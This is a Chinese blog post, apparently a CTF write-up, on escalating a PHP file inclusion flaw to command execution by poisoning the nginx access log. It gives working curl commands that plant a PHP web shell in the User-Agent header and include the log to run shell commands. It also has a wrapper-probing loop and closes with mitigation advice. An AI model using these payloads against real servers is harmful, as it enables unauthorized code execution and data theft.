---
layout: post
title: 日志文件也是可控文件：一次 LFI 到命令执行
summary: 过滤器把冒号禁掉之后，所有 wrapper 都废了。但磁盘上还有一个文件，内容由我写。
tags: LFI 文件包含 过滤器
date: 2026-10-18 10:20:00 +0800
---

题目是个文件读取页面，参数叫 `path`，把文件内容打回页面。题面说 flag 在 `/flag.txt` —— 读了，是空的。权限不够。

剩下的路只有一条：让它执行代码。所以先得确认它到底是在执行，还是只是读。

## 先确认它在执行，还是在读

这一步容易跳过，可它决定了后面所有打法。`include` 会真的执行文件里的 PHP，`file_get_contents`、`readfile` 不会。

分辨的办法很土：找个只含 PHP、没有任何输出的文件，让它读。

```bash
# 文件里只有一行：<?php echo 6*7; ?>
curl -s "$URL?path=/tmp/marker.php"
```

页面出来 `42`，说明是 `include`。要是把源码原样打出来，那它就只是在读文件，后面得换思路。

我又顺手试了 `?path=index.php`，源码能读出来 —— 省了很多猜测：`include($path)`，上面盖了一层 `preg_match` 黑名单。

## 把黑名单试出来

不知道黑名单里有什么的时候，猜是最费时间的。我干脆把打算用的东西逐类试一遍，看哪些被挡：

```bash
for p in "php://filter/convert.base64-encode/resource=index.php" \
         "data://text/plain;base64,PD9waHAgZWNobyA0Mjs/Pg==" \
         "file:///etc/passwd" "glob:///var/www/*" "/etc/passwd"; do
  printf '%-70s ' "$p"
  curl -s -G --data-urlencode "path=$p" "$URL" | grep -o '敏感\|禁止' | head -1
done
```

结果是：**带冒号的，一个都没过**。这一下把所有 wrapper 都打死了 —— `php://`、`data://`、`phar://`、`glob://`，全废。

顺便试出来两个边界：`PHP://` 一样被挡，说明冒号本身就在表里；`..` 没被截断，跳目录是通的，但既然能用绝对路径，也就不必绕。

## 没有 wrapper，就去找一个内容由我控制的文件

这时能走的路只剩"读一个真实文件"。要成立得满足三条：位置固定、服务进程读得到、内容我能写进去。

常见的候选有三个：Web 服务器的访问日志、PHP 的 session 文件、上传的临时文件。这次是日志 —— nginx 默认格式里会记 User-Agent，而 UA 是我发的。

```bash
# 把 PHP 写进 UA
curl -s "$URL" -A '<?php system($_GET["c"]); ?>' -o /dev/null

# 再包含日志
curl -s -G --data-urlencode "path=/var/log/nginx/access.log" \
     --data-urlencode "c=id" "$URL"
```

第一次没成。原因挺典型：日志里的引号和空格会被转义成 `\x22`、`\x20`，payload 直接写坏了。改成不含引号、不含空格的写法就通了：

```php
<?php system($_GET[c]);?>
```

（日志格式不一定记 UA，这也要先确认 —— 路径可读的话先读一眼，看代码该塞进哪个字段。）

`c=id` 回来 `uid=33(www-data)`，接着 `c=cat /flag.txt`，flag 到手。

## 这条路为什么成立

日志文件对服务进程可读、位置固定、路径可猜，而它的一部分内容由外部请求决定。对 `include` 来说，这三条就够 —— 它不关心文件叫什么、从哪来。

反过来想，任何"能被外部写、又能被服务进程读到"的文件都能当跳板：邮件队列、应用自己的报错日志、缓存文件、上传目录里哪怕扩展名叫 `.jpg` 的东西。`include` 不看扩展名。

## 修法

- **别用黑名单挡函数**。`include` 的入口应该是白名单 —— 固定的几个文件、一张映射表，而不是"把危险字符滤掉"。
- 真要读文件，用 `realpath()` 收敛到固定目录，并检查结果确实落在目录里。
- `disable_functions` 补上 `system`、`exec`、`shell_exec`、`passthru` 这几个，`open_basedir` 收紧。这两条挡不住 LFI，但能把"读到就执行"变成"读到而已"。
- 日志目录别让 Web 进程读。

## 复现清单

```bash
# 1. 判 include
?path=/tmp/marker.php        # 内容 <?php echo 6*7; ?>，页面出 42
# 2. 试黑名单
?path=php://filter/...       # 被挡 ⇒ 冒号在黑名单里
# 3. 种 payload（无空格无引号）
curl -A '<?php system($_GET[c]);?>' "$URL"
# 4. 包含日志
?path=/var/log/nginx/access.log&c=id
```

边界也说清楚：这条路要求三个条件同时成立 —— **是 include 不是读**、**日志真的是个文件**（容器里日志常常直接进 stdout，那就没这个文件）、**路径能猜**。缺一个，就得回去换别的路。
